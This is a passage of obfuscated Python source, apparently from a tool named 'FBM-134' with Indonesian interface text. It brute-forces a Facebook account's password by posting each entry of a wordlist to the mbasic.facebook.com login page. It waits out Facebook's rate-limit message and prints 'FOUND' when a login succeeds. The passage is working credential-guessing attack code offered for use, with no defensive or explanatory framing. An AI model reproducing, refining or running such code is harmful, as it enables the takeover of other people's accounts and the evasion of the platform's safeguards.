        time.sleep(1)
        os.system('clear')
        _____________banner()
        ___________WEB________________ = "https://mbasic.facebook.com/login.php"
        print(colors.LightRed + "[*] " +
              colors.LightGreen + 'FBM-134 : ' + _version)
        print(colors.LightRed + "[*] " +
              colors.LightGreen + 'ACCOUNT : ' + u________ + '-')
        print(colors.LightRed + "[*] " + colors.LightGreen + colors.LightRed +
              'MEMULAI : ' + colors.LightGreen + "In Time %s" % time.strftime("%X"))
        for x in ___open:
            _n += 1
            _x__________ += 1
            lop_ = x.strip()
            ___________Dt_ = {'email': u________, 'pass': lop_, 'login': 'Masuk'}
            ___________fr_ = requests.post(
                ___________WEB________________, ___________Dt_)
            responsex = ___________fr_.url
            response = ___________fr_.text
            sys.stdout.write('\r' + colors.LightRed + "[*] " + colors.LightGreen + colors.LightGreen +
                             'ATTEMPT : [' + colors.LightRed + str(_n) + colors.LightGreen + ':' + _no___ + ']')
            sys.stdout.flush()
            #Waktu Serangan
            time.sleep(120)

            if _x__________ == 65:
                _x__________ = 0

            if (response.find('Kami membatasi seberapa sering Anda dapat memposting') != -1):
                os.system("clear")
                __banner_warning()
                print(colors.LightRed + "[*] " +
                      colors.LightGreen + 'FBM-134 : ' + _version)
                print(colors.LightRed +
                      "[*] " + colors.LightGreen + 'ACCOUNT : ' + u________ + '-')
                print(colors.LightRed + "[*] " + colors.LightGreen + colors.LightRed +
                      'SELESAI : ' + colors.LightGreen + "In 1 Hour 20 Minutes")
                print(colors.LightRed + "[*] " + colors.LightGreen + colors.LightGreen +
                      'ATTEMPT : [' + colors.LightRed + str(_n) + colors.LightGreen + ':' + _no___ + ']')
                print(colors.LightRed + "[*] " + colors.LightYellow +
                      "WARNING : " + colors.LightGreen + "Please Wait , -- ")
                time.sleep(4800)
                os.system("clear")
                _____________banner()
                print(colors.LightRed + "[*] " +
                      colors.LightGreen + 'FBM-134 : ' + _version)
                print(colors.LightRed +
                      "[*] " + colors.LightGreen + 'ACCOUNT : ' + u________ + '-')
                print(colors.LightRed + "[*] " + colors.LightGreen + colors.LightRed +
                      'MEMULAI : ' + colors.LightGreen + "IN TIME %s" % time.strftime("%X"))

            if responsex.find("home.php") != -1:
                os.system("clear")
                _____________banner()
                print(colors.LightRed + "[*] " +
                      colors.LightGreen + 'FBM-134 : ' + _version)
                print(colors.LightRed + "[*] " + colors.LightYellow + 'ACCOUNT : ' + colors.Blue + "[" +
                      colors.LightBlue + "FOUND" + colors.Blue + "] " + colors.LightGreen + u________ + '-')
                print(colors.LightRed + "[*] " + colors.LightYellow + "ATTEMPT :" + colors.Blue + " [" +
                      colors.LightBlue + "FOUND" + colors.Blue + "] " + colors.LightGreen + lop_ + colors.Green)
                break
    except KeyboardInterrupt:
        os.system("clear")
        print(colors.Red + "[*] " + colors.LightGreen  + "Shutting Down The FBM-134 Console" + colors.Default)



# start
if __name__ == "__main__":
    __Starting_()
